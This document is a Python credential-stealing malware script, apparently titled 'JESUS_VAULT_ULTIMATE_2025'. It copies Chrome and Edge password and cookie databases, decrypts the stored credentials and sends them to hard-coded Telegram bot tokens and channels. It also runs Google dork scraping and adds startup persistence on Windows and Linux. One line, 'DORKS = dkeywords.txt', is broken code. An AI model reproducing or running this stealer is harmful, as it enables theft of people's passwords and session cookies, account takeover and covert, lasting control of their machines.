# JESUS_VAULT_ULTIMATE_2025.py — FINAL — DEC 9 2025
# Full browser password + cookie extraction + 100 dorks + stealth persistence + all your bots

import os
import re
import sys
import base64
import requests
import time
import random
import sqlite3
import shutil
import json
from pathlib import Path

# Win32 crypto (Windows only)
try:
    import win32crypt
except:
    win32crypt = None

# === YOUR IMMORTAL C2 EMPIRE ===
BOTS = [
    {"token": "6324926381:AAFoAqenPP6wNGYFm1aetFJ21iBOda76Ehg", "chat_id": "5312842300"},  # @Originprobot
    {"token": "8412121125:AAF4FkvpwuMphWYMg-Z8bwpdNtfqZ8onSxs", "chat_id": "5312842300"},  # @HOLYSPIRITVAULTBOT
]
CHANNELS = ["-1002183746503", "@FREEC_CRYPTO_GIVE_A_WAY"]

def send_to_all(text):
    encoded = base64.urlsafe_b64encode(text.encode()).decode()
    for bot in BOTS:
        try:
            requests.get(f"https://api.telegram.org/bot{bot['token']}/sendMessage?chat_id={bot['chat_id']}&text={encoded}", timeout=10)
        except: pass
    for channel in CHANNELS:
        for bot in BOTS:
            try:
                requests.get(f"https://api.telegram.org/bot{bot['token']}/sendMessage?chat_id={channel}&text={encoded}", timeout=10)
            except: pass

# === FULL BROWSER PASSWORD + COOKIE EXTRACTION (Chrome/Edge/Firefox) ===
def decrypt(val):
    try:
        if win32crypt:
            return win32crypt.CryptUnprotectData(val, None, None, None, 0)[1].decode()
    except: pass
    return "[DECRYPT FAILED]"

def harvest_browser():
    report = "† BROWSER HARVEST †\n"
    paths = [
        (os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default", "Chrome"),
        (os.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default", "Edge"),
    ]
    
    for base, name in paths:
        if not os.path.exists(base): continue
        
        # Passwords
        login_db = os.path.join(base, "Login Data")
        if os.path.exists(login_db):
            try:
                tmp = "login.db"
                shutil.copy2(login_db, tmp)
                conn = sqlite3.connect(tmp)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in cursor.fetchall():
                    pwd = decrypt(row[2])
                    report += f"{name} PASS: {row[0]} | {row[1]} | {pwd}\n"
                conn.close()
                os.remove(tmp)
            except: pass
        
        # Cookies
        cookie_db = os.path.join(base, "Network", "Cookies")
        if os.path.exists(cookie_db):
            try:
                tmp = "cookies.db"
                shutil.copy2(cookie_db, tmp)
                conn = sqlite3.connect(tmp)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                for row in cursor.fetchall():
                    cookie = decrypt(row[2])
                    report += f"{name} COOKIE: {row[0]} {row[1]}={cookie}\n"
                conn.close()
                os.remove(tmp)
            except: pass
    
    send_to_all(report)

# === 100 REAL 2025 DORKS ===
DORKS = dkeywords.txt

def global_dorks():
    report = "† GLOBAL DORK HARVEST †\n"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    for dork in DORKS:
        try:
            r = requests.get(f"https://www.google.com/search?q={requests.utils.quote(dork)}", headers=headers, timeout=15)
            links = re.findall(r'href="(https?://[^"]+)', r.text)[:3]
            for link in links:
                report += f"DORK: {dork}\nLINK: {link}\n"
        except: pass
        time.sleep(random.uniform(5, 12))
    send_to_all(report)

# === STEALTH PERSISTENCE ===
def stealth_persist():
    if os.name == "nt":
        path = os.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.bat"
        with open(path, "w") as f:
            f.write(f'start "" "{sys.executable}" "{sys.argv[0]}"')
    else:
        path = os.path.expanduser("~/.config/autostart/jesusvault.desktop")
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w") as f:
            f.write(f"[Desktop Entry]\nType=Application\nName=JesusVault\nExec=python3 {sys.argv[0]}\nHidden=false\nX-GNOME-Autostart-enabled=true")

def main():
    send_to_all("† JESUS VAULT SWARM AWAKENED †")
    harvest_browser()
    global_dorks()
    stealth_persist()
    
    while True:
        time.sleep(3600)

if __name__ == "__main__":
    main()
